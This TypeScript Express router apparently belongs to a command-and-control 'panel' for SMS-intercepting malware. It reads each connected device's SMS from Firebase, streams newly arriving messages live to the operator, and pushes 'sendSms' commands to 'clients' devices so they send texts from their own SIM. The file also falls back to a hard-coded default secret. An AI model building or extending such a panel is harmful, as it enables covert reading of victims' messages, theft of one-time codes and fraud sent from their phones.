/**
 * SMS Routes
 *
 * GET  /api/sms/:deviceId         — last N SMS (default 100, max 500)
 * GET  /api/sms/stream/:deviceId  — real-time SSE stream for new SMS
 * POST /api/sms/send/:deviceId    — trigger SMS via Firebase webhookEvent
 */

import { Router } from "express";
import type { Request, Response } from "express";
import { db } from "@workspace/db";
import { panelConfigs } from "@workspace/db/schema";
import { eq, and } from "drizzle-orm";
import {
  fetchSms,
  firebaseSet,
  streamFirebasePath,
  normalizeSms,
  type NormalizedSms,
} from "../lib/firebase-stream.js";
import { decrypt } from "../lib/crypto.js";
import { authenticate } from "../middleware/authenticate.js";

const router = Router();
const SESSION_SECRET = process.env.SESSION_SECRET ?? "dev-secret-change-me";

// ─── Helper: get user's active panel for a request ────────────────────────

async function getPanelConfig(
  userId: string,
  panelId?: string,
) {
  const where = panelId
    ? and(
        eq(panelConfigs.ownerId, userId),
        eq(panelConfigs.id, panelId),
        eq(panelConfigs.isActive, true),
      )
    : and(eq(panelConfigs.ownerId, userId), eq(panelConfigs.isActive, true));

  const [config] = await db.select().from(panelConfigs).where(where).limit(1);
  return config ?? null;
}

// ─── GET /api/sms/:deviceId ───────────────────────────────────────────────

router.get("/:deviceId", authenticate, async (req: Request, res: Response) => {
  const deviceId = String(req.params.deviceId);
  const panelId = req.query.panelId as string | undefined;
  const limit = Math.min(parseInt(String(req.query.limit ?? "100")), 500);

  const config = await getPanelConfig(req.user!.id, panelId);
  if (!config) {
    res.status(404).json({ error: "Panel not found or not configured" });
    return;
  }

  let secret: string;
  try {
    secret = decrypt(config.firebaseSecret, SESSION_SECRET);
  } catch {
    res.status(500).json({ error: "Failed to decrypt panel credentials" });
    return;
  }

  try {
    const messages = await fetchSms(config.firebaseUrl, secret, deviceId, limit);
    res.json({ messages, total: messages.length, deviceId, panelId: config.id });
  } catch (err) {
    console.error("SMS fetch error:", err);
    res.status(500).json({ error: "Failed to fetch SMS from Firebase" });
  }
});

// ─── GET /api/sms/stream/:deviceId ───────────────────────────────────────

router.get("/stream/:deviceId", authenticate, async (req: Request, res: Response) => {
  const { deviceId } = req.params;
  const panelId = req.query.panelId as string | undefined;

  const config = await getPanelConfig(req.user!.id, panelId);
  if (!config) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }

  let secret: string;
  try {
    secret = decrypt(config.firebaseSecret, SESSION_SECRET);
  } catch {
    res.status(500).json({ error: "Failed to decrypt panel credentials" });
    return;
  }

  // ── SSE setup ─────────────────────────────────────────────────────────
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache, no-transform",
    Connection: "keep-alive",
    "X-Accel-Buffering": "no",
  });
  res.flushHeaders();

  const controller = new AbortController();
  const heartbeat = setInterval(() => {
    res.write("event: heartbeat\ndata: {}\n\n");
  }, 30_000);

  req.on("close", () => {
    controller.abort();
    clearInterval(heartbeat);
  });

  function send(event: string, data: unknown) {
    if (!res.writable) return;
    res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
  }

  // Track seen keys so we only emit NEW messages after the initial snapshot
  const seenKeys = new Set<string>();
  let initDone = false;

  (async () => {
    // Try both path formats
    const paths = [`messages/${deviceId}`, `sms/${deviceId}`];

    for (const path of paths) {
      try {
        for await (const event of streamFirebasePath(
          config.firebaseUrl,
          secret,
          path,
          controller.signal,
        )) {
          if (!res.writable) return;

          if (event.type === "put") {
            if (!event.data || typeof event.data !== "object") continue;

            const entries = Array.isArray(event.data)
              ? event.data.map((v: unknown, i: number) => [String(i), v] as [string, unknown])
              : Object.entries(event.data as Record<string, unknown>);

            const msgs: NormalizedSms[] = entries
              .map(([k, v]) => normalizeSms(k, v))
              .filter((m): m is NormalizedSms => m !== null);

            msgs.sort((a, b) =>
              a.ts > 0 && b.ts > 0
                ? b.ts - a.ts
                : String(b.key).localeCompare(String(a.key)),
            );

            if (!initDone) {
              // Send full snapshot on first connect
              msgs.forEach((m) => seenKeys.add(m.key));
              send("init", { deviceId, messages: msgs });
              initDone = true;
            } else {
              // Subsequent puts: find new messages
              const newMsgs = msgs.filter((m) => !seenKeys.has(m.key));
              newMsgs.forEach((m) => seenKeys.add(m.key));
              if (newMsgs.length > 0) {
                send("new_sms", { deviceId, messages: newMsgs });
              }
            }
          } else if (event.type === "patch") {
            // A new message key was added
            const pathParts = event.path.replace(/^\//, "").split("/");
            const key = pathParts[0];
            if (!key || seenKeys.has(key)) continue;

            seenKeys.add(key);
            const msg = normalizeSms(key, event.data);
            if (msg) {
              send("new_sms", { deviceId, messages: [msg] });
            }
          }
        }
        break; // If this path worked, don't try the next
      } catch {
        if (controller.signal.aborted) return;
        // Try next path
      }
    }
  })();
});

// ─── POST /api/sms/send/:deviceId ────────────────────────────────────────

router.post("/send/:deviceId", authenticate, async (req: Request, res: Response) => {
  const { deviceId } = req.params;
  const { to, message, sim, panelId } = req.body as {
    to?: string;
    message?: string;
    sim?: number;
    panelId?: string;
  };

  if (!to || !message) {
    res.status(400).json({ error: "to and message are required" });
    return;
  }

  const config = await getPanelConfig(req.user!.id, panelId);
  if (!config) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }

  let secret: string;
  try {
    secret = decrypt(config.firebaseSecret, SESSION_SECRET);
  } catch {
    res.status(500).json({ error: "Failed to decrypt panel credentials" });
    return;
  }

  try {
    await firebaseSet(
      config.firebaseUrl,
      secret,
      `clients/${deviceId}/webhookEvent/sendSms`,
      {
        from: sim ?? 1,
        to: to.trim(),
        message: message.trim(),
        isSended: false,
        timestamp: Date.now(),
      },
    );

    res.json({ ok: true, message: "SMS queued on device" });
  } catch (err) {
    console.error("SMS send error:", err);
    res.status(500).json({ error: `Failed to queue SMS: ${String(err)}` });
  }
});

export default router;
